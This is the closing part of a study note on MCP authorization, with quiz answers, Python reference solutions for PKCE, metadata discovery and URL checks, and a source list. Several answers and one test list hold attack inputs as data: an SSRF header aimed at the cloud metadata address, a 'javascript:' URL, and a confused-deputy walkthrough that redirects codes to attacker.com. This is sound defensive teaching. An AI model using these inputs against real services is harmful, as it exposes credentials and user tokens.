  "answer": "1. Read `resource_metadata` (and maybe `scope`) from the `WWW-Authenticate` header, or try the well-known PRM URLs (path first, then root).\n2. Fetch the Protected Resource Metadata (RFC 9728). Check that `resource` equals the server URL. Read `authorization_servers`.\n3. Fetch the AS metadata (RFC 8414 or OpenID Connect Discovery, in the spec's priority order). Check that `issuer` is identical to the issuer used. Check that `code_challenge_methods_supported` exists.\n4. Get a `client_id`: pre-registered, else a Client ID Metadata Document if `client_id_metadata_document_supported` is true, else Dynamic Client Registration (deprecated).\n5. Make a PKCE verifier and S256 challenge, a random `state`, and record the issuer.\n6. Open the browser at the authorization endpoint with `response_type=code`, `client_id`, `redirect_uri`, `code_challenge`, `code_challenge_method=S256`, `scope`, `state` and `resource`.\n7. Receive `code`, `state` and `iss` at the redirect URI. Check `state` and `iss`.\n8. POST to the token endpoint with `grant_type=authorization_code`, `code`, `redirect_uri`, `client_id`, `code_verifier` and `resource`.\n9. Send each MCP request with `Authorization: Bearer <token>`."
}
```

```check
{
  "question": "Compute the S256 code challenge for the verifier `dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`. Why are both the verifier and the challenge 43 characters long?",
  "answer": "SHA-256 of the 43 ASCII bytes is `13d31e961a1ad8ec2f16b10c4c982e0876a878ad6df144566ee1894acb70f9c3` (32 bytes). Base64url without padding gives `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM`. Both values encode 32 bytes. 32 bytes are 256 bits, and Base64 carries 6 bits per character, so $\\lceil 256 / 6 \\rceil = 43$ characters. Base64 with padding would write 44 characters, the last one being `=`, which base64url for PKCE removes."
}
```

```check
{
  "question": "An MCP server receives a valid, unexpired JWT signed by its own authorization server, but the `aud` claim is `https://crm.example.com`. The server's URI is `https://mcp.example.com/mcp`. What must it do, and what attack does the rule prevent?",
  "answer": "Reject it with HTTP 401. The spec says MCP servers MUST validate that tokens were issued specifically for them as the intended audience (RFC 8707), and MUST only accept tokens valid for their own resources. Accepting it would allow token reuse across services: a token that a user gave the CRM could be replayed against the MCP server. If the server then forwarded it to the CRM, that would also be token passthrough, which breaks rate limits, audit trails and trust boundaries."
}
```

```check
{
  "question": "Interview follow-up: What changed in MCP authorization in revision 2026-07-28? Give the SEP or PR for each change.",
  "answer": "1. Issuer identification (SEP-2468): authorization servers SHOULD include `iss` in authorization responses (RFC 9207). Clients MUST record the expected issuer before the redirect and MUST validate a present `iss` by exact string comparison before they redeem the code, also on error responses. If the AS advertises `authorization_response_iss_parameter_supported: true` and `iss` is absent, the client rejects the response. This stops mix-up attacks.\n2. `application_type` (SEP-837): clients MUST send an appropriate value during Dynamic Client Registration: `native` for desktop, CLI and localhost apps, `web` for remote browser apps.\n3. Credentials bound to the issuer (SEP-2352): key persisted credentials by `issuer`, never reuse them with another AS, and register again when the AS changes.\n4. Dynamic Client Registration deprecated (PR #2858) in favor of Client ID Metadata Documents."
}
```

```check
{
  "question": "Interview follow-up: Explain the confused deputy attack on an MCP proxy server step by step, and the four controls that stop it.",
  "answer": "Conditions: the proxy uses one static client ID at a third-party AS, lets MCP clients register dynamically, the third-party AS sets a consent cookie, and the proxy has no consent of its own. Steps: the user connects once, so the cookie exists. The attacker registers a client at the proxy with redirect URI attacker.com and sends the user a crafted link. The third-party AS sees the cookie and skips consent. The proxy sends its MCP authorization code to the attacker's redirect URI. The attacker redeems it and acts as the user. Controls (all MUST for proxies): a per-user registry of approved `client_id` values checked before the third-party flow, a proxy-owned consent page that names the client, scopes and redirect URI with CSRF protection and no framing, exact redirect URI matching, and a single-use, short-lived `state` that is set only after the user approves."
}
```

```check
{
  "question": "Interview follow-up: A cloud-hosted agent connects to a user-supplied MCP server URL. The server returns `WWW-Authenticate: Bearer resource_metadata=\"http://169.254.169.254/latest/meta-data/iam/\"`. What is the risk and what should the client do?",
  "answer": "This is SSRF through OAuth discovery. 169.254.169.254 is the link-local cloud metadata service, which can return instance credentials. If the client fetches the URL and leaks the response in an error or a later request, the attacker gets cloud credentials. The best-practices page says clients deployed on a server MUST consider SSRF. They SHOULD require HTTPS outside loopback development, block private and reserved ranges including 169.254.0.0/16, validate every redirect hop, consider pinning DNS results between check and use, and route discovery through an egress proxy. The spec also warns against hand-written IP parsing because of octal, hex and IPv4-mapped IPv6 tricks."
}
```

```check
{
  "question": "Interview follow-up: A client holds a token with scope `files:read`. A tool call returns `403` with `WWW-Authenticate: Bearer error=\"insufficient_scope\", scope=\"files:write\"`. What scope does the client request next, and why not just `files:write`?",
  "answer": "`files:read files:write`. The step-up flow tells the client to compute the union of the previously requested scopes and the challenged scopes, then re-authorize and retry a limited number of times. If the client asked only for `files:write`, the new token would lose `files:read`, and the next read would fail with another 403. The spec makes scope accumulation a client-side responsibility, so servers can stay stateless about client scope sets."
}
```

```check
{
  "question": "Why does the 2026-07-28 spec say that the host must still ask a human before some tool calls, even when OAuth is configured perfectly?",
  "answer": "OAuth decides whether the client may call the server, with which scopes. It does not decide whether this particular call is what the user wants. The model chooses the call, and it reads untrusted text: tool results can carry prompt injection, tool descriptions can be poisoned, and a server can change its definitions after approval. Annotations such as `readOnlyHint` are untrusted unless the server is trusted. So the tools page says there SHOULD always be a human in the loop with the ability to deny tool invocations, and applications SHOULD show confirmation prompts. Least privilege limits what a manipulated model can do with a valid token."
}
```

```check
{
  "question": "Exercise 1: show a reference solution.",
  "answer": "Real output: `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM True`, then `43 43`, then `True False`.\n\n```python\nimport base64\nimport hashlib\nimport secrets\n\nUNRESERVED = set(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~\")\n\n\ndef b64url(data: bytes) -> str:\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode(\"ascii\")\n\n\ndef make_verifier() -> str:\n    return b64url(secrets.token_bytes(32))          # 32 random bytes -> 43 characters\n\n\ndef challenge_s256(verifier: str) -> str:\n    assert 43 <= len(verifier) <= 128 and set(verifier) <= UNRESERVED\n    return b64url(hashlib.sha256(verifier.encode(\"ascii\")).digest())\n\n\ndef server_check(stored_challenge: str, presented_verifier: str) -> bool:\n    return secrets.compare_digest(challenge_s256(presented_verifier), stored_challenge)\n\n\n# RFC 7636 Appendix B test vector\nv = \"dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\"\nc = challenge_s256(v)\nprint(c, c == \"E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\")\nmine = make_verifier()\nprint(len(mine), len(challenge_s256(mine)))\nprint(server_check(c, v), server_check(c, mine))\n```"
}
```

```check
{
  "question": "Exercise 2: show a reference solution.",
  "answer": "Real output: the five URLs of section 7.2, the two URLs for an issuer without a path, and `False` for the attacker document.\n\n```python\nfrom urllib.parse import urlsplit\n\n\ndef prm_candidates(mcp_url: str) -> list[str]:\n    \"\"\"Well-known Protected Resource Metadata URLs, in the order a client tries them.\"\"\"\n    u = urlsplit(mcp_url)\n    root = f\"{u.scheme}://{u.netloc}/.well-known/oauth-protected-resource\"\n    path = u.path.rstrip(\"/\")\n    return [root + path, root] if path else [root]\n\n\ndef as_metadata_candidates(issuer: str) -> list[str]:\n    \"\"\"Authorization server metadata URLs, in the priority order of the MCP spec.\"\"\"\n    u = urlsplit(issuer)\n    base = f\"{u.scheme}://{u.netloc}\"\n    path = u.path.rstrip(\"/\")\n    if path:\n        return [f\"{base}/.well-known/oauth-authorization-server{path}\",\n                f\"{base}/.well-known/openid-configuration{path}\",\n                f\"{base}{path}/.well-known/openid-configuration\"]\n    return [f\"{base}/.well-known/oauth-authorization-server\",\n            f\"{base}/.well-known/openid-configuration\"]\n\n\ndef metadata_is_usable(doc: dict, issuer_used: str) -> bool:\n    \"\"\"RFC 8414 section 3.3: the issuer in the document must be identical.\"\"\"\n    return doc.get(\"issuer\") == issuer_used\n\n\nfor url in prm_candidates(\"https://example.com/public/mcp\"):\n    print(url)\nfor url in as_metadata_candidates(\"https://auth.example.com/tenant1\"):\n    print(url)\nfor url in as_metadata_candidates(\"https://auth.example.com\"):\n    print(url)\nprint(metadata_is_usable({\"issuer\": \"https://honest.example\"}, \"https://attacker.example\"))\n```"
}
```

```check
{
  "question": "Exercise 3: show a reference solution.",
  "answer": "Real output: `ok` for the public host, a refusal for each of the next six URLs, and `ok (loopback, development only)` for the last call. The function checks only IP literals. A real client must also check every address that a host name resolves to, at connect time.\n\n```python\nimport ipaddress\nfrom urllib.parse import urlsplit\n\nLOOPBACK_NAMES = {\"localhost\"}\n\n\ndef check_oauth_url(url: str, allow_loopback_http: bool = False) -> str:\n    \"\"\"Return 'ok' or the reason to refuse a URL found during OAuth discovery.\n\n    It checks the scheme and IP literals only. A host name still needs a check\n    of every address it resolves to, at connect time (DNS rebinding).\"\"\"\n    u = urlsplit(url)\n    host = (u.hostname or \"\").lower()\n    if u.scheme not in (\"https\", \"http\"):\n        return f\"refuse: scheme {u.scheme!r}\"\n    try:\n        ip = ipaddress.ip_address(host)\n    except ValueError:\n        ip = None\n    if ip is not None and ip.version == 6 and ip.ipv4_mapped:\n        ip = ip.ipv4_mapped                      # ::ffff:10.0.0.1 is 10.0.0.1\n    is_loopback = host in LOOPBACK_NAMES or (ip is not None and ip.is_loopback)\n    if is_loopback and allow_loopback_http:\n        return \"ok (loopback, development only)\"\n    if u.scheme == \"http\":\n        return \"refuse: http outside loopback development\"\n    if ip is not None and (ip.is_private or ip.is_link_local or ip.is_loopback or ip.is_reserved):\n        return f\"refuse: internal address {ip}\"\n    return \"ok\"\n\n\nfor url in [\"https://auth.example.com/.well-known/oauth-authorization-server\",\n            \"http://169.254.169.254/latest/meta-data/\",\n            \"https://169.254.169.254/latest/meta-data/\",\n            \"https://[::ffff:10.0.0.1]/token\",\n            \"https://192.168.1.1/admin\",\n            \"javascript:alert(1)\",\n            \"http://127.0.0.1:3000/callback\"]:\n    print(f\"{url:62} {check_oauth_url(url)}\")\nprint(check_oauth_url(\"http://127.0.0.1:3000/callback\", allow_loopback_http=True))\n```"
}
```

```check
{
  "question": "Exercise 4: show a reference solution.",
  "answer": "Real output: `insufficient_scope`, then `files:read files:write`. The parser is simple: it breaks on quoted values that contain commas. Use a real header parser in production.\n\n```python\ndef parse_challenge(header: str) -> dict:\n    \"\"\"Parse a simple Bearer challenge: Bearer k1=\"v1\", k2=\"v2\".\"\"\"\n    scheme, _, rest = header.partition(\" \")\n    assert scheme == \"Bearer\"\n    params = {}\n    for part in rest.split(\",\"):\n        key, _, value = part.strip().partition(\"=\")\n        params[key] = value.strip('\"')\n    return params\n\n\ndef step_up_scopes(previous: set[str], header: str) -> str:\n    \"\"\"The scope string for re-authorization: the union of old and challenged scopes.\"\"\"\n    challenged = set(parse_challenge(header).get(\"scope\", \"\").split())\n    return \" \".join(sorted(previous | challenged))\n\n\nh = ('Bearer error=\"insufficient_scope\", scope=\"files:write\", '\n     'resource_metadata=\"https://mcp.example.com/.well-known/oauth-protected-resource\"')\nprint(parse_challenge(h)[\"error\"])\nprint(step_up_scopes({\"files:read\"}, h))\n```"
}
```

## 17. Links

- Previous: [L10: Utilities: progress, cancellation, pagination, errors](/notes/ai/llm-systems/07-mcp/l10-utilities-and-errors)
- Next: [L12: What is new: the version history](/notes/ai/llm-systems/07-mcp/l12-whats-new-version-history)
- [L4: Transports: stdio and Streamable HTTP](/notes/ai/llm-systems/07-mcp/l4-transports): Origin validation and the HTTP headers
- [L5: Stateful vs stateless MCP](/notes/ai/llm-systems/07-mcp/l5-stateful-vs-stateless): sessions and state handles
- [L6: Tools in depth](/notes/ai/llm-systems/07-mcp/l6-tools-in-depth): annotations and their limits
- [L13: Build an MCP server and client](/notes/ai/llm-systems/07-mcp/l13-build-an-mcp-server): the server behind the measured responses
- [Tool security and prompt injection](/notes/ai/context-engineering/06-tools-and-mcp/l9-tool-security-and-prompt-injection)
- [Self-asserted identity](/notes/software-engineering/security-and-operations/01-access-control/l1-self-asserted-identity): why a user id in a request proves nothing
- [User identity in Databricks Apps](/notes/platforms/databricks/02-identity-and-auth/l3-user-identity-in-apps)
- [Drill: MCP](/notes/ai/llm-systems/08-interview-drills/l4-chain-mcp)


### Sources

All checked on 2026-10-15.

- MCP specification 2026-07-28: [Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization), [Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery), [Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration), [Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations), [Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools), [Changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- MCP docs: [Security Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices), [Security Best Practices 2025-11-25](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices), [Local Server Security](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/local-server-security)
- MCP extensions: [OAuth Client Credentials](https://modelcontextprotocol.io/extensions/auth/oauth-client-credentials), [Enterprise-Managed Authorization](https://modelcontextprotocol.io/extensions/auth/enterprise-managed-authorization), [blog post of 2026-06-18](https://blog.modelcontextprotocol.io/posts/enterprise-managed-auth/)
- IETF: [RFC 7636 PKCE](https://datatracker.ietf.org/doc/html/rfc7636), [RFC 8414](https://datatracker.ietf.org/doc/html/rfc8414), [RFC 8707](https://datatracker.ietf.org/doc/html/rfc8707), [RFC 9207](https://datatracker.ietf.org/doc/html/rfc9207), [RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728), [OAuth 2.1 draft 13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13), [Client ID Metadata Document draft 00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00)
- MCP Python SDK 2.3.0 (`AuthSettings`, `TokenVerifier`, `AccessToken`), run in these notes
